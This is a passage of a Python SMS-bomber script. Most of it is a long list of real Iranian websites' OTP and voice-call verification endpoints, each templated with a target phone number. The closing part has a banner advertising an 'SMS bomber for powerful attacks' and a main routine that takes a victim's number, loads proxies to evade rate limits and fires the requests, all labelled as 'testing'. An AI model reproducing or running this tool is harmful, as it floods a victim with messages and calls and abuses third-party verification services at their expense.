        {"name": "Mobit", "method": "POST", "url": "https://api.mobit.ir/api/web/v8/register/register", "payload": {"number": "${phone}"}},
        {"name": "Ghabzino", "method": "POST", "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", "payload": {"Parameters": {"ApplicationType": "Web", "MobileNumber": "${phone}"}}},
        {"name": "Komodaa", "method": "POST", "url": "https://api.komodaa.com/api/v2.6/loginRC/request", "payload": {"phone_number": "${phone}"}},
        {"name": "Bargh-e Man", "method": "POST", "url": "https://uiapi2.saapa.ir/api/otp/sendCode", "payload": {"mobile": "${phone}", "from_meter_buy": False}},
        {"name": "Vandar", "method": "POST", "url": "https://api.vandar.io/account/v1/check/mobile", "payload": {"mobile": "${phone}"}},
        {"name": "Pinorest", "method": "POST", "url": "https://api.pinorest.com/frontend/auth/login/mobile", "payload": {"mobile": "${phone}"}},
        {"name": "Tetherland", "method": "POST", "url": "https://service.tetherland.com/api/v5/login-register", "payload": {"mobile": "${phone}"}},
        {"name": "Behtarino", "method": "POST", "url": "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", "payload": {"phone": "${phone}"}},
        {"name": "Doctoreto", "method": "GET", "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register", "params": {"mobile": "${phone}", "country_id": 205}},
        {"name": "Okala", "method": "POST", "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister", "payload": {"mobile": "${phone}", "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False}},
        {"name": "Beroozmarket", "method": "POST", "url": "https://api.beroozmart.com/api/pub/account/send-otp", "payload": {"mobile": "${phone}", "sendViaSms": True}},
        {"name": "Itoll", "method": "POST", "url": "https://app.itoll.com/api/v1/auth/login", "payload": {"mobile": "${phone}"}},
        {"name": "Pinket", "method": "POST", "url": "https://pinket.com/api/cu/v2/phone-verification", "payload": {"phoneNumber": "${phone}"}},
        {"name": "Football360", "method": "POST", "url": "https://football360.ir/api/auth/verify-phone/", "payload": {"phone_number": "${phone}"}},
        {"name": "MrBilit", "method": "GET", "url": "https://auth.mrbilit.com/api/login/exists/v2", "params": {"mobileOrEmail": "${phone}", "source": 2, "sendTokenIfNot": "true"}},
        {"name": "Lendo", "method": "POST", "url": "https://api.lendo.ir/api/customer/auth/send-otp", "payload": {"mobile": "${phone}"}},
        {"name": "Fidibo", "method": "POST", "url": "https://fidibo.com/user/login-by-sms", "data": "mobile_number=${phone}&country_code=ir"},
        {"name": "Pateh", "method": "POST", "url": "https://api.pateh.com/api/v1/LoginOrRegister", "payload": {"mobile": "${phone}"}},
        {"name": "RayanErtebat", "method": "POST", "url": "https://pay.rayanertebat.ir/api/User/Otp", "payload": {"mobileNo": "${phone}"}},
        {"name": "Pindo", "method": "POST", "url": "https://api.pindo.ir/v1/user/login-register/", "payload": {"phone": "${phone}"}},
        {"name": "Delino", "method": "POST", "url": "https://www.delino.com/user/register", "payload": {"mobile": "${phone}"}},
        {"name": "Zoodex", "method": "POST", "url": "https://admin.zoodex.ir/api/v1/login/check", "payload": {"mobile": "${phone}"}},
        {"name": "Kukala", "method": "POST", "url": "https://api.kukala.ir/api/user/Otp", "payload": {"phoneNumber": "${phone}"}},
        {"name": "Baskool", "method": "POST", "url": "https://www.buskool.com/send_verification_code", "payload": {"phone": "${phone}"}},
        {"name": "3tex", "method": "POST", "url": "https://3tex.io/api/1/users/validation/mobile", "payload": {"receptorPhone": "${phone}"}},
        {"name": "DeniizShop", "method": "POST", "url": "https://deniizshop.com/api/v1/sessions/login_request", "payload": {"mobile_number": "${phone}"}},
        {"name": "Flightio", "method": "POST", "url": "https://flightio.com/bff/Authentication/CheckUserKey", "payload": {"userKey": "${phone}"}},
        {"name": "Pooleno", "method": "POST", "url": "https://api.pooleno.ir/v1/auth/check-mobile", "payload": {"mobile": "${phone}"}},
        {"name": "WideApp", "method": "POST", "url": "https://agent.wide-app.ir/auth/token", "payload": {"grant_type": "otp", "client_id": "62b30c4af53e3b0cf100a4a0", "phone": "${phone}"}},
        {"name": "BitBarg", "method": "POST", "url": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin", "payload": {"phone": "${phone}"}},
        {"name": "BahramShop", "method": "POST", "url": "https://api.bahramshop.ir/api/user/validate/username", "payload": {"username": "${phone}"}},
        {"name": "Chamedoon", "method": "POST", "url": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", "payload": {"mobile": "${phone}"}},
        {"name": "Kilid", "method": "POST", "url": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", "payload": {"mobile": "${phone}"}},
        {"name": "Otaghak", "method": "POST", "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", "payload": {"userName": "${phone}"}},
        {"name": "Shab", "method": "POST", "url": "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", "payload": {"mobile": "${phone}"}},
        {"name": "Raybit", "method": "POST", "url": "https://api.raybit.net:3111/api/v1/authentication/register/mobile", "payload": {"mobile": "${phone}"}},
        {"name": "FarviShop", "method": "POST", "url": "https://farvi.shop/api/v1/sessions/login_request", "payload": {"mobile_phone": "${phone}"}},
        {"name": "a4baz", "method": "POST", "url": "https://a4baz.com/api/web/login", "payload": {"cellphone": "${phone}"}},
        {"name": "AnarGift", "method": "POST", "url": "https://api.anargift.com/api/people/auth", "payload": {"user": "${phone}"}},
        {"name": "Simkhan", "method": "POST", "url": "https://www.simkhanapi.ir/api/users/registerV2", "payload": {"mobileNumber": "${phone}"}},
        {"name": "SibIrani", "method": "POST", "url": "https://sandbox.sibirani.ir/api/v1/user/invite", "payload": {"username": "${phone}"}},
        {"name": "HyperJan", "method": "POST", "url": "https://shop.hyperjan.ir/api/users/manage", "payload": {"mobile": "${phone}"}},
        {"name": "HiWord", "method": "POST", "url": "https://hiword.ir/wp-json/otp-login/v1/login", "payload": {"identifier": "${phone}"}},
        {"name": "Tikban", "method": "POST", "url": "https://tikban.com/Account/LoginAndRegister", "payload": {"cellPhone": "${phone}"}},
        {"name": "Dicardo", "method": "POST", "url": "https://dicardo.com/main/sendsms", "payload": {"phone": "${phone}"}},
        {"name": "Khanoumi", "method": "POST", "url": "https://www.khanoumi.com/accounts/sendotp", "payload": {"mobile": "${phone}"}},
        {"name": "RojaShop", "method": "POST", "url": "https://rojashop.com/api/auth/sendOtp", "payload": {"mobile": "${phone}"}},
        {"name": "Dadpardaz", "method": "POST", "url": "https://dadpardaz.com/advice/getLoginConfirmationCode", "payload": {"mobile": "${phone}"}},
        {"name": "Rokla", "method": "POST", "url": "https://api.rokla.ir/api/request/otp", "payload": {"mobile": "${phone}"}},
        {"name": "Pezeshket", "method": "POST", "url": "https://api.pezeshket.com/core/v1/auth/requestCode", "payload": {"mobileNumber": "${phone}"}},
        {"name": "Virgool", "method": "POST", "url": "https://virgool.io/api/v1.4/auth/verify", "payload": {"method": "phone", "identifier": "${phone}"}},
        {"name": "Timcheh", "method": "POST", "url": "https://api.timcheh.com/auth/otp/send", "payload": {"mobile": "${phone}"}},
        {"name": "Paklean", "method": "POST", "url": "https://client.api.paklean.com/user/resendCode", "payload": {"username": "${phone}"}},
        {"name": "Daal", "method": "POST", "url": "https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request", "payload": {"phone": "${phone}"}},
        {"name": "Bimebazar", "method": "POST", "url": "https://bimebazar.com/accounts/api/login_sec/", "payload": {"username": "${phone}"}},
        {"name": "SafarMarket", "method": "POST", "url": "https://safarmarket.com//api/security/v2/user/otp", "payload": {"phone": "${phone}"}},
        {"name": "Emtiaz", "method": "POST", "url": "https://web.emtiyaz.app/json/login", "data": "send=1&cellphone=${phone}"},
        {"name": "Bama", "method": "POST", "url": "https://bama.ir/signin-checkforcellnumber", "data": "cellNumber=${phone}"},
        {"name": "Snapp Doctor", "method": "GET", "url": "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/${phone}/sms?cCode=+98"},
        {"name": "Trip (Call)", "method": "POST", "url": "https://gateway.trip.ir/api/Totp", "payload": {"PhoneNumber": "${phone}"}},
        {"name": "Paklean (Call)", "method": "POST", "url": "https://client.api.paklean.com/user/resendVoiceCode", "payload": {"username": "${phone}"}},
        {"name": "Ragham (Call)", "method": "POST", "url": "https://web.raghamapp.com/api/users/code", "payload": {"phone": "${phone}"}},
        {"name": "Tebinja", "method": "POST", "url": "https://www.tebinja.com/api/v1/users", "payload": {"username": "${phone}"}},
        {"name": "Dosma", "method": "POST", "url": "https://app.dosma.ir/api/v1/account/send-otp/", "payload": {"mobile": "${phone}"}},
        {"name": "Sibbazar", "method": "POST", "url": "https://sandbox.sibbazar.com/api/v1/user/invite", "payload": {"username": "${phone}"}},
        {"name": "Pubisha", "method": "POST", "url": "https://www.pubisha.com/login/checkCustomerActivation", "data": "mobile=${phone}"},
        {"name": "Wisgoon", "method": "POST", "url": "https://gateway.wisgoon.com/api/v1/auth/login/", "payload": {"phone": "${phone}"}},
        {"name": "Tagmond", "method": "POST", "url": "https://tagmond.com/phone_number", "data": "phone_number=${phone}"},
        {"name": "Olgoo", "method": "POST", "url": "https://www.olgoobooks.ir/sn/userRegistration/", "data": {"contactInfo[mobile]": "${phone}"}},
        {"name": "PakhshShop", "method": "POST", "url": "https://www.pakhsh.shop/wp-admin/admin-ajax.php", "data": "action=digits_check_mob&mobileNo=${phone}"},
        {"name": "Didnegar", "method": "POST", "url": "https://www.didnegar.com/wp-admin/admin-ajax.php", "data": "action=digits_check_mob&mobileNo=${phone}"},
        {"name": "See5", "method": "POST", "url": "https://crm.see5.net/api_ajax/sendotp.php", "data": {"mobile": "${phone}", "action": "sendsms"}},
        {"name": "DrSaina", "method": "POST", "url": "https://www.drsaina.com/RegisterLogin", "data": "PhoneNumber=${phone}"},
        {"name": "Limome", "method": "POST", "url": "https://my.limoome.com/api/auth/login/otp", "data": {"mobileNumber": "${phone}", "country": "1"}},
        {"name": "Devsloop", "method": "POST", "url": "https://i.devslop.app/app/ifollow/api/otp.php", "data": "number=${phone}&state=number"},
        {"name": "Ghasedak24", "method": "POST", "url": "https://ghasedak24.com/user/ajax_register", "data": {"username": "${phone}"}},
        {"name": "Iranketab", "method": "POST", "url": "https://www.iranketab.ir/account/register", "data": {"UserName": "${phone}"}},
        {"name": "Takfarsh", "method": "POST", "url": "https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", "data": {"phone_email": "${phone}"}},
        {"name": "Iranicard", "method": "POST", "url": "https://api.iranicard.ir/api/v1/register", "data": {"mobile": "${phone}"}},
        {"name": "PubgSell", "method": "GET", "url": "https://pubg-sell.ir/loginuser?username=${phone}"},
        {"name": "Tj8", "method": "POST", "url": "https://tj8.ir/auth/register", "data": {"mobile": "${phone}"}},
        {"name": "Mashinbank", "method": "POST", "url": "https://mashinbank.com/api2/users/check", "data": {"mobileNumber": "${phone}"}},
        {"name": "Cinematicket", "method": "POST", "url": "https://cinematicket.org/api/v1/users/signup", "payload": {"phone_number": "${phone}"}},
        {"name": "Kafegheymat", "method": "POST", "url": "https://kafegheymat.com/shop/getLoginSms", "data": {"phone": "${phone}"}},
        {"name": "Opco", "method": "POST", "url": "https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", "data": {"telephone": "${phone}"}},
        {"name": "Melix", "method": "POST", "url": "https://melix.shop/site/api/v1/user/otp", "payload": {"mobile": "${phone}"}},
        {"name": "Safiran", "method": "POST", "url": "https://safiran.shop/login", "payload": {"mobile": "${phone}"}},
        {"name": "Pirankalaco", "method": "POST", "url": "https://pirankalaco.ir/shop/SendPhone.php", "data": "phone=${phone}"},
        {"name": "Tnovin", "method": "POST", "url": "http://shop.tnovin.com/login", "data": "phone=${phone}"},
        {"name": "Dastakht", "method": "POST", "url": "https://dastkhat-isad.ir/api/v1/user/store", "payload": {"mobile": "${phone}", "countryCode": 98, "device_os": 2}},
        {"name": "Hamlex", "method": "POST", "url": "https://hamlex.ir/register.php", "data": "phoneNumber=${phone}&register="},
        {"name": "Irwco", "method": "POST", "url": "https://irwco.ir/register", "data": "mobile=${phone}"},
        {"name": "Moshaveran724", "method": "POST", "url": "https://moshaveran724.ir/m/pms.php", "data": "againkey=${phone}&cache=false"},
        {"name": "Sibbank", "method": "POST", "url": "https://api.sibbank.ir/v1/auth/login", "payload": {"phone_number": "${phone}"}},
        {"name": "Steelalborz", "method": "POST", "url": "https://steelalborz.com/wp-admin/admin-ajax.php", "data": "action=digits_check_mob&mobileNo=${phone}"},
        {"name": "Arshian", "method": "POST", "url": "https://api.arshiyan.com/send_code", "payload": {"country_code": "98", "phone_number": "${phone}"}},
        {"name": "Topnoor", "method": "POST", "url": "https://backend.topnoor.ir/web/v1/user/otp", "payload": {"mobile": "${phone}"}},
        {"name": "Alinance", "method": "POST", "url": "https://api.alinance.com/user/register/mobile/send/", "payload": {"phone_number": "${phone}"}},
        {"name": "Alopeyk Safir", "method": "POST", "url": "https://api.alopeyk.com/safir-service/api/v1/login", "payload": {"phone": "${phone}"}},
        {"name": "Chaymarket", "method": "POST", "url": "https://www.chaymarket.com/wp-admin/admin-ajax.php", "data": "action=digits_check_mob&mobileNo=${phone}"},
        {"name": "Ehteraman", "method": "POST", "url": "https://api.ehteraman.com/api/request/otp", "payload": {"mobile": "${phone}"}},
        {"name": "Hamrahbours", "method": "POST", "url": "https://api.hbbs.ir/authentication/SendCode", "payload": {"MobileNumber": "${phone}"}},
        {"name": "Homtick", "method": "POST", "url": "https://auth.homtick.com/api/V1/User/GetVerifyCode", "payload": {"mobileOrEmail": "${phone}"}},
        {"name": "Iranamlaak", "method": "POST", "url": "https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms", "payload": {"AgencyMobile": "${phone}"}},
        {"name": "Karchidari", "method": "POST", "url": "https://api.kcd.app/api/v1/auth/login", "payload": {"mobile": "${phone}"}},
        {"name": "Mazoo", "method": "POST", "url": "https://mazoocandle.ir/login", "payload": {"phone": "${phone}"}},
        {"name": "Paymishe", "method": "POST", "url": "https://api.paymishe.com/api/v1/otp/registerOrLogin", "payload": {"mobile": "${phone}"}},
        {"name": "Podro", "method": "POST", "url": "https://api.pod.ir/api/v1/otp/registerOrLogin", "payload": {"mobile": "${phone}"}},
        {"name": "Rayshomar", "method": "POST", "url": "https://api.rayshomar.ir/api/Register/RegistrMobile", "data": "MobileNumber=${phone}"},
        {"name": "Amoomilad", "method": "POST", "url": "https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode", "payload": {"PhoneNumber": "${phone}"}},
        {"name": "Bitex24", "method": "GET", "url": "https://bitex24.com/api/v1/auth/sendSms?mobile=${phone}&dial_code=0"},
        {"name": "Candoosms", "method": "POST", "url": "https://www.candoosms.com/wp-admin/admin-ajax.php", "data": "action=send_sms&phone=${phone}"},
        {"name": "Offch", "method": "POST", "url": "https://api.offch.com/auth/otp", "payload": {"username": "${phone}"}},
        {"name": "Sabziman", "method": "POST", "url": "https://sabziman.com/wp-admin/admin-ajax.php", "data": "action=newphoneexist&phonenumber=${phone}"},
        {"name": "Tajtehran", "method": "POST", "url": "https://tajtehran.com/RegisterRequest", "data": "mobile=${phone}&password=mamad1234"},
        {"name": "MrBilit (Call)", "method": "GET", "url": "https://auth.mrbilit.com/api/Token/send/byCall?mobile=${phone}"},
        {"name": "Gap (Call)", "method": "GET", "url": "https://core.gap.im/v1/user/resendCode.json?mobile=${phone}&type=IVR"},
        {"name": "Novibook (Call)", "method": "POST", "url": "https://novinbook.com/index.php?route=account/phone", "data": "phone=${phone}&call=yes"},
        {"name": "Azki (Call)", "method": "GET", "url": "https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=${phone}"},
        {"name": "Janebi", "method": "POST", "url": "https://janebi.com/signin?do", "data": {"resend": "${phone}"}},
        {"name": "4hair", "method": "POST", "url": "https://4hair.ir/user/login.php", "data": {"num": "${phone}", "ok": ""}},
        {"name": "iGame", "method": "POST", "url": "https://igame.ir/api/play/otp/send", "payload": {"phone": "${phone}"}},
        {"name": "TWsms", "method": "POST", "url": "https://twsms.ir/client/register.php", "data": {"mobile": "${phone}", "agree": "agree", "sendsms": "1"}},
        {"name": "BaradaranToy", "method": "POST", "url": "https://baradarantoy.ir/send_confirm_sms_ajax.php", "data": {"user_tel": "${phone}"}},
        {"name": "KavirMotor", "method": "POST", "url": "https://kavirmotor.com/sms/send", "payload": {"phoneNumber": "${phone}"}},
        {"name": "Chechilas", "method": "POST", "url": "https://chechilas.com/user/login", "data": {"mob": "${phone}"}},
        {"name": "Searchii", "method": "POST", "url": "https://searchii.ir//controler//phone_otp.php", "data": {"mobile_number": "${phone}", "action": "send_otp", "login": "user"}},
        {"name": "Badparak", "method": "POST", "url": "https://badparak.com/register/request_verification_code", "payload": {"mobile": "${phone}"}},
        {"name": "HermesKala", "method": "POST", "url": "https://hermeskala.com//login/send_vcode", "payload": {"mobile_number": "${phone}"}},
        {"name": "ElinorBoutique", "method": "POST", "url": "https://api.elinorboutique.com/v1/customer/register-login", "payload": {"mobile": "${phone}"}},
        {"name": "AtlasMode", "method": "POST", "url": "https://api.atlasmode.ir/v1/customer/register-login?version=new2", "payload": {"mobile": "${phone}"}},
        {"name": "PooshakShoniz", "method": "POST", "url": "https://api.pooshakshoniz.com/v1/customer/register-login?version=new1", "payload": {"mobile": "${phone}"}},
        {"name": "Ubike", "method": "POST", "url": "https://ubike.ir/index.php?route=extension/module/websky_otp/send_code", "data": {"telephone": "${phone}"}},
        {"name": "Benedito", "method": "POST", "url": "https://api.benedito.ir/v1/customer/register-login?version=new1", "payload": {"mobile": "${phone}"}},
        {"name": "Rubeston", "method": "POST", "url": "https://www.rubeston.com/api/customers/login-register", "payload": {"mobile": "${phone}", "step": "1"}},
        {"name": "PrimaShop", "method": "POST", "url": "https://primashop.ir/index.php?route=extension/module/websky_otp/send_code", "data": {"telephone": "${phone}"}},
        {"name": "PayaGym", "method": "POST", "url": "https://payagym.com/wp-admin/admin-ajax.php", "data": {"mobile": "${phone}", "action": "kerasno_proform_register_inline_send"}},
        {"name": "Bartarinha", "method": "POST", "url": "https://bartarinha.com/Advertisement/Users/RequestLoginMobile", "data": {"mobileNo": "${phone}"}},
        {"name": "ManoShahr", "method": "POST", "url": "https://manoshahr.ir/jq.php", "data": {"mobile": "${phone}", "class_name": "public_login", "function_name": "sendCode"}},
        {"name": "NalinoCo", "method": "POST", "url": "https://www.nalinoco.com/api/customers/login-register", "payload": {"mobile": "${phone}", "step": "1"}},
        {"name": "Hiss", "method": "POST", "url": "https://hiss.ir/wp-admin/admin-ajax.php", "data": {"phone_email": "${phone}", "action": "bakala_send_code"}},
        {"name": "Tahrir-Online", "method": "POST", "url": "https://tahrir-online.ir/wp-admin/admin-ajax.php", "data": {"phone": "${phone}", "action": "mobix_send_otp_code"}},
        {"name": "MartDay", "method": "POST", "url": "https://martday.ir/api/customer/member/register/", "data": {"email": "${phone}", "accept_term": "on"}},
        {"name": "Paaakar", "method": "POST", "url": "https://api.paaakar.com/v1/customer/register-login?version=new1", "payload": {"mobile": "${phone}"}},
        {"name": "ElectraStore", "method": "POST", "url": "https://electrastore.ir/index.php?route=extension/module/websky_otp/send_code", "data": {"telephone": "${phone}"}},
        {"name": "AtrinElec", "method": "POST", "url": "https://www.atrinelec.com/ajax/SendSmsVerfiyCode", "data": {"mobile": "${phone}"}},
        {"name": "KetabWeb", "method": "POST", "url": "https://ketabweb.com/login/?usernameCheck=1", "data": {"username": "${phone}"}},
        {"name": "Dastaneman", "method": "POST", "url": "https://dastaneman.com/User/SendCode", "data": {"mobile": "${phone}"}},
        {"name": "80w", "method": "POST", "url": "https://80w.ir/wp-admin/admin-ajax.php", "data": {"login": "${phone}", "action": "logini_first"}},
        {"name": "NoavarPub", "method": "POST", "url": "https://noavarpub.com/logins/login.php", "data": {"phone": "${phone}", "submit": "123"}},
        {"name": "HovalVakil", "method": "GET", "url": "https://api.hovalvakil.com/api/User/SendConfirmCode?userName=${phone}"},
        {"name": "DigiGhate", "method": "GET", "url": "https://api.digighate.com/v2/public/code?phone=${phone}"},
        {"name": "AzarbadBook", "method": "POST", "url": "https://azarbadbook.ir/ajax/login_j_ajax_ver/", "data": {"phone": "${phone}"}},
        {"name": "KanoonBook", "method": "POST", "url": "https://www.kanoonbook.ir/store/customer_otp", "data": {"customer_username": "${phone}", "task": "customer_phone"}},
        {"name": "CheshmandazKetab", "method": "POST", "url": "https://www.cheshmandazketab.ir/Register", "data": {"phone": "${phone}", "login": "1"}},
        {"name": "Ketab.ir", "method": "GET", "url": "https://sso-service.ketab.ir/api/v2/signup/otp?Mobile=${phone}&OtpSmsType=1"},
        {"name": "SnappShop", "method": "POST", "url": "https://apix.snappshop.co/auth/v1/pre-login", "payload": {"mobile": "${phone}"}},
        {"name": "Ketabium", "method": "POST", "url": "https://www.ketabium.com/login-register", "data": {"username": "${phone}"}},
        {"name": "RiraBook", "method": "POST", "url": "https://rirabook.com/loginAth", "data": {"mobile1": "${phone}", "loginbt1": ""}},
        {"name": "PashikShoes", "method": "POST", "url": "https://api.pashikshoes.com/v1/customer/register-login", "payload": {"mobile": "${phone}"}},
        {"name": "ShimaShoes", "method": "POST", "url": "https://shimashoes.com/api/customer/member/register/", "data": {"email": "${phone}"}},
        {"name": "TamimPishro", "method": "POST", "url": "https://www.tamimpishro.com/site/api/v1/user/otp", "payload": {"mobile": "${phone}"}},
        {"name": "Fafait", "method": "POST", "url": "https://api2.fafait.net/oauth/check-user", "payload": {"id": "${phone}"}},
        {"name": "Telewebion", "method": "POST", "url": "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", "payload": {"code": "98", "phone": "${phone}", "smsStatus": "default"}},
        {"name": "Caropex", "method": "POST", "url": "https://caropex.com/api/v1/user/login", "payload": {"mobile": "${phone}"}},
        {"name": "NovinMedical", "method": "POST", "url": "https://novinmedical.com/wp-admin/admin-ajax.php", "data": {"action": "stm_login_register", "type": "mobile", "input": "${phone}"}},
        {"name": "Dalfak", "method": "POST", "url": "https://www.dalfak.com/api/auth/sendVerificationCode", "payload": {"type": 1, "value": "${phone}"}},
        {"name": "SetShoe", "method": "POST", "url": "https://setshoe.ir/wp-admin/admin-ajax.php", "data": {"action": "stm_login_register", "type": "mobile", "input": "${phone}"}},
        {"name": "MaxBax", "method": "POST", "url": "https://maxbax.com/wp-admin/admin-ajax.php", "data": {"action": "bakala_send_code", "phone_email": "${phone}"}},
        {"name": "ParkBag", "method": "POST", "url": "https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber", "data": {"MobaileNumber": "${phone}"}},
        {"name": "TelKetab", "method": "POST", "url": "https://telketab.com/opt_field/check_secret", "data": {"identity": "${phone}"}},
        {"name": "AdinehBook", "method": "POST", "url": "https://www.adinehbook.com/gp/flex/sign-in.html", "data": {"action": "sign", "phone_cell_or_email": "${phone}"}},
        {"name": "GitaMehr", "method": "POST", "url": "https://gitamehr.ir/wp-admin/admin-ajax.php", "data": {"action": "stm_login_register", "type": "mobile", "input": "${phone}"}},
        {"name": "SunnyBook", "method": "POST", "url": "https://sunnybook.ir/Home/RegisterUser", "data": {"mobile": "${phone}"}},
        {"name": "Mahouney", "method": "POST", "url": "https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber", "data": {"MobaileNumber": "${phone}"}},
        {"name": "MyRoz", "method": "POST", "url": "https://myroz.ir/wp-admin/admin-ajax.php", "data": {"action": "stm_login_register", "type": "mobile", "input": "${phone}"}},
        {"name": "Meidane", "method": "POST", "url": "https://meidane.com/accounts/login", "data": {"mobile": "${phone}"}},
        {"name": "iCkala", "method": "POST", "url": "https://ickala.com/", "data": {"controller": "SendSMS", "fc": "module", "module": "loginbymobile", "SubmitSmsSend": "1", "ajax": "true", "otp_mobile_num": "${phone}"}},
        {"name": "ElecMarket", "method": "POST", "url": "https://elecmarket.ir/wp-admin/admin-ajax.php", "data": {"action": "stm_login_register", "type": "mobile", "input": "${phone}"}},
        {"name": "TechSiro", "method": "POST", "url": "https://techsiro.com/send-otp", "payload": {"mobile": "${phone}"}},
        {"name": "NovinParse", "method": "POST", "url": "https://novinparse.com/Page/PageAction.aspx", "data": {"Action": "SendVerifyCode", "mobile": "${phone}"}},
        {"name": "TitoMarket", "method": "POST", "url": "https://titomarket.com/index.php?route=account/login_verify/verify", "data": {"telephone": "${phone}"}},
        {"name": "NikanBike", "method": "POST", "url": "https://nikanbike.com/", "data": {"controller": "authentication", "fc": "module", "module": "iverify", "phone_mobile": "${phone}", "SubmitCheck": ""}},
        {"name": "Account724", "method": "POST", "url": "https://account724.com/wp-admin/admin-ajax.php", "data": {"action": "stm_login_register", "type": "mobile", "input": "${phone}"}},
        {"name": "Eaccount", "method": "POST", "url": "https://eaccount.ir/api/v1/sessions/login_request", "payload": {"mobile_phone": "${phone}"}},
        {"name": "QueenAccessories", "method": "POST", "url": "https://queenaccessories.ir/api/v1/sessions/login_request", "payload": {"mobile_phone": "${phone}"}},
        {"name": "RastarAccessory", "method": "POST", "url": "https://rastaraccessory.ir/api/v1/sessions/login_request", "payload": {"mobile_phone": "${phone}"}},
        {"name": "VinaAccessory", "method": "POST", "url": "https://vinaaccessory.com/api/v1/sessions/login_request", "payload": {"mobile_phone": "${phone}"}},
        {"name": "ChortkehShop", "method": "POST", "url": "https://chortkehshop.ir/api/v1/sessions/login_request", "payload": {"mobile_phone": "${phone}"}},
        {"name": "PiinkStore", "method": "POST", "url": "https://piinkstore.ir/api/v1/sessions/login_request", "payload": {"mobile_phone": "${phone}"}},
        {"name": "DreamlandShop", "method": "POST", "url": "https://dreamlandshop.ir/api/v1/sessions/login_request", "payload": {"mobile_phone": "${phone}"}},
        {"name": "MyDigiPay", "method": "POST", "url": "https://app.mydigipay.com/digipay/api/users/send-sms", "payload": {"cellNumber": "${phone}", "device": {"deviceId": "a16e6255-17c3-431b-b047-3f66d24c286f", "deviceModel": "WEB_BROWSER", "deviceAPI": "WEB_BROWSER", "osName": "WEB"}}},
        {"name": "FoodCenter", "method": "POST", "url": "https://www.foodcenter.ir/account/sabtmobile", "data": "mobile=${phone}"},
        {"name": "MoboGift", "method": "POST", "url": "https://mobogift.com/signin", "payload": {"username": "${phone}"}},
        {"name": "IranTic", "method": "POST", "url": "https://www.irantic.com/api/login/request", "payload": {"mobile": "${phone}"}},
        {"name": "Dadhesab", "method": "POST", "url": "https://api.dadhesab.ir/user/entry", "payload": {"username": "${phone}"}},
        {"name": "RefahTea", "method": "POST", "url": "https://refahtea.ir/wp-admin/admin-ajax.php", "data": {"mobile": "${phone}"}},
        {"name": "Snapp Digital", "method": "POST", "url": "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", "payload": {"cellphone": "${phone}"}},
        {"name": "MamiFood", "method": "POST", "url": "https://mamifood.org/Registration.aspx/SendValidationCode", "payload": {"Phone": "${phone}"}},
        {"name": "WatchOnline", "method": "POST", "url": "https://api.watchonline.shop/api/v1/otp/request", "payload": {"mobile": "${phone}"}},
        {"name": "Digify", "method": "POST", "url": "https://apollo.digify.shop/graphql", "payload": {"operationName": "Mutation", "variables": {"content": {"phone_number": "${phone}"}}, "query": "mutation Mutation($content: MerchantRegisterOTPSendContent) { merchantRegister { otpSend(content: $content) __typename } }"}}
    ]
    
    apis.extend(all_apis)
    return apis

console = Console()
ascii_art = r"""
                  ___   _______ ___
                 / _ | / __/ _ <  /
                / __ |_\ \/ // / / 
               /_/ |_/___/\___/_/ 
"""

console.print(ascii_art, style="bold red")
time.sleep(3)
init(autoreset=True)

top_border = "╔" + "═" * 46 + "╗"
bottom_border = "╚" + "═" * 46 + "╝"

lines = [
    "║             --->Камолак<---                  ║",
    "║            SMS Bomber System                 ║",
    "║       SMS bomber for powerful attacks        ║",
    "║                                              ║"
]

message = "The scars of pain remain..."
width = 46
centered_message = f"║{message.center(width)}║"

print(Fore.GREEN + top_border)
for line in lines:
    print(Fore.GREEN + line)
print(Fore.RED + centered_message)
print(Fore.GREEN + bottom_border)
def main():
    
    tester = SMSAPITester()
    
    phone_number = input("Enter phone number:")
    
    use_proxy = input("Use proxies? (y/n): ")
    if use_proxy == 'y':
        proxy_file = input("Enter proxy file path:").strip()
        try:
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            tester.set_proxies(proxies)
            print(f"{Fore.GREEN}Loaded {len(proxies)} proxies{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error loading proxies: {str(e)}{Style.RESET_ALL}")
    
    try:
        delay = float(input(f"Enter delay between requests (seconds):") or "3")
        tester.delay = delay
    except:
        print(f"Invalid delay, using default: 3 seconds")
    
    print(f"{Fore.GREEN}Loading API configurations...{Style.RESET_ALL}")
    api_list = create_api_configs()
    
    input(f"Press Enter to start testing...")
    
    try:
        tester.run_api_test(api_list, phone_number)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Test interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Unexpected error: {str(e)}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
